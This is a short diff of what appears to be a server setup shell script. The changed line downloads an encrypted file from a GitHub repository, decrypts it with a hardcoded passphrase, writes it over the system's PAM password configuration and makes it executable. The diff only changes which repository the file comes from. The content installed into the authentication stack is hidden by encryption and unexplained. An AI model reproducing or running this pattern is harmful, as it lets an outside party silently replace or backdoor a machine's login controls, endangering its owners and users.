@@ -20,7 +20,7 @@ commonname=none
 email=zianfth@gmail.com
 
 # simple password minimal
-curl -sS https://raw.githubusercontent.com/galat41/bkn/main/waluh/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
+curl -sS https://raw.githubusercontent.com/richnstore/bkn/main/waluh/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
 chmod +x /etc/pam.d/common-password
 
 # go to root
